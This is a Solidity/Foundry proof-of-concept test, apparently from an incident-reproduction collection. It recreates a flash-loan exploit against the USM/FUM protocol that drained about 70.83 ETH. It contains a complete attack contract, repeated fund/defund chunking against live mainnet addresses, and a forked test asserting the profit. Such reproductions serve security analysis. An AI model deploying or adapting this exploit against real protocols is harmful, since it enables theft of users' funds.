// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

// @KeyInfo - Total Lost : ~70.83 ETH (~$160K)
// Attacker : https://etherscan.io/address/0xb92b2E47680c89DA8f951B8963ef469f461a50Fc
// Attack Contract : https://etherscan.io/address/0x5a5e29ba89663a3558273354E990426F3cAc7de7
// Profit Receiver : https://etherscan.io/address/0xE3C6346b6f282029312d2caf4677ef39BeaBBF99
// Vulnerable Contract : https://etherscan.io/address/0x2a7FFf44C19f39468064ab5e5c304De01D591675 (USM)
// FUM Token : https://etherscan.io/address/0x86729873e3b88de2ab85ca292d6d6d69d548edf3
// Attack Tx : https://etherscan.io/tx/0xfae5e751b8ce01457cbb6b529839f24a0cff50faaabcbd0fd02ca0cf559b050e
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x2a7FFf44C19f39468064ab5e5c304De01D591675#code
//
// @Analysis
// Twitter Guy : https://x.com/TenArmorAlert/status/2086627835360456784
//
// Root cause: USM fund() slides ethUsdPrice and bidAskAdjustment upward with the pool
// growth factor. That inflated mid-price inflates ethBuffer (USM liability priced at a
// higher ETH/USD), which inflates the FUM sell price used by defund(). A single large
// Morpho-funded fund() followed by many equal-sized defund() chunks extracts more ETH
// than was deposited — ~70.83 ETH from the ethPool — while leaving FUM/USM supplies
// unchanged and the stored mid price wildly broken (~6.5M vs ~$1,922).

interface IUSM {
    function fund(address to, uint256 minFumOut) external payable returns (uint256 fumOut);
    function defund(address payable to, uint256 fumToBurn, uint256 minEthOut) external returns (uint256 ethOut);
    function ethPool() external view returns (uint256);
    function fum() external view returns (address);
    function totalSupply() external view returns (uint256);
    function fumTotalSupply() external view returns (uint256);
    function latestPrice() external view returns (uint256);
    function bidAskAdjustment() external view returns (uint256);
}

interface IFUM is IERC20 {
    function usm() external view returns (address);
}

interface IMorphoBlue {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface IWETH9 is IERC20 {
    function deposit() external payable;
    function withdraw(uint256) external;
}

contract USM_FUM_Exploit {
    IMorphoBlue constant MORPHO = IMorphoBlue(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb);
    IWETH9 constant WETH = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUSM constant USM = IUSM(0x2a7FFf44C19f39468064ab5e5c304De01D591675);
    // Same flash size as the live attack tx.
    uint256 constant FLASH_AMOUNT = 11_579_978_354_608_392_803_524;
    // Live attack defunded in 64 equal FUM chunks.
    uint256 constant DEFUND_CHUNKS = 64;

    address public owner;

    constructor(address owner_) {
        owner = owner_;
    }

    /// @notice Morpho flash-loan → fund USM → loop defund → repay → send profit.
    function attack() external {
        require(msg.sender == owner, "not owner");
        // Morpho pulls repayment via transferFrom; approve before flash.
        WETH.approve(address(MORPHO), type(uint256).max);
        MORPHO.flashLoan(address(WETH), FLASH_AMOUNT, "");
        // Residual ETH is pure profit from the fund/defund asymmetry.
        uint256 profit = address(this).balance;
        if (profit > 0) {
            // Wrap so the harness can measure ERC-20 profit cleanly.
            WETH.deposit{value: profit}();
            WETH.transfer(owner, profit);
        }
    }

    function onMorphoFlashLoan(uint256 assets, bytes calldata) external {
        require(msg.sender == address(MORPHO), "not morpho");

        // 1. Unwrap flash WETH → ETH for USM.fund{value:}.
        WETH.withdraw(assets);

        // 2. Fund: deposit nearly all flash ETH, mint FUM. Leave a tiny dust for gas/safety.
        //    Live attack funded with essentially the full unwrap.
        uint256 ethIn = address(this).balance;
        USM.fund{value: ethIn}(address(this), 0);

        // 3. Defund in equal chunks. Chunking matters: each defund re-reads inflated mid
        //    price / ethBuffer and the arithmetic-avg sell approximation overpays vs fund.
        IFUM fum = IFUM(USM.fum());
        uint256 fumBal = fum.balanceOf(address(this));
        uint256 chunk = fumBal / DEFUND_CHUNKS;
        for (uint256 i = 0; i < DEFUND_CHUNKS; i++) {
            uint256 burnAmt = (i + 1 == DEFUND_CHUNKS) ? fum.balanceOf(address(this)) : chunk;
            if (burnAmt == 0) break;
            USM.defund(payable(address(this)), burnAmt, 0);
        }

        // 4. Re-wrap enough ETH to repay Morpho; leftover ETH is profit.
        uint256 need = assets;
        require(address(this).balance >= need, "cannot repay");
        WETH.deposit{value: need}();
        // Approval already set; Morpho pulls `assets` after this callback returns.
    }

    receive() external payable {}
}

contract ContractTest is BaseTestWithBalanceLog {
    // Pre-attack block (attack mined in 25716150).
    uint256 constant FORK_BLOCK = 25_716_149;

    address constant ATTACKER = 0xb92b2E47680c89DA8f951B8963ef469f461a50Fc;
    address constant USM_ADDR = 0x2a7FFf44C19f39468064ab5e5c304De01D591675;
    address constant FUM_ADDR = 0x86729873e3b88DE2Ab85CA292D6d6D69D548eDF3;
    address constant WETH_ADDR = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant MORPHO_ADDR = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;

    USM_FUM_Exploit internal exploit;

    function setUp() public {
        // Offline anvil port for mainnet (see _shared/run-poc/chains.conf).
        vm.createSelectFork("http://127.0.0.1:8545", FORK_BLOCK);
        fundingToken = WETH_ADDR;
        attacker = ATTACKER; // balanceLog measures the profit-receiving EOA

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(USM_ADDR, "USM");
        vm.label(FUM_ADDR, "FUM");
        vm.label(WETH_ADDR, "WETH");
        vm.label(MORPHO_ADDR, "Morpho Blue");

        exploit = new USM_FUM_Exploit(ATTACKER);
        vm.label(address(exploit), "USM_FUM_Exploit");
    }

    function testExploit() public balanceLog {
        // Log pool drain alongside attacker profit.
        uint256 poolBefore = IUSM(USM_ADDR).ethPool();
        emit log_named_decimal_uint("USM ethPool before", poolBefore, 18);
        emit log_named_decimal_uint("USM latestPrice before", IUSM(USM_ADDR).latestPrice(), 18);
        emit log_named_decimal_uint("USM bidAskAdj before", IUSM(USM_ADDR).bidAskAdjustment(), 18);

        vm.prank(ATTACKER);
        exploit.attack();

        uint256 poolAfter = IUSM(USM_ADDR).ethPool();
        emit log_named_decimal_uint("USM ethPool after", poolAfter, 18);
        emit log_named_decimal_uint("USM latestPrice after", IUSM(USM_ADDR).latestPrice(), 18);
        emit log_named_decimal_uint("USM bidAskAdj after", IUSM(USM_ADDR).bidAskAdjustment(), 18);
        emit log_named_decimal_uint("USM ethPool drained", poolBefore - poolAfter, 18);

        uint256 profit = IERC20(WETH_ADDR).balanceOf(ATTACKER);
        emit log_named_decimal_uint("Attacker WETH profit", profit, 18);
        // Live incident extracted ~70.83 ETH; allow a small band for rounding/chunk edge effects.
        assertGt(profit, 50 ether, "profit too low");
    }
}
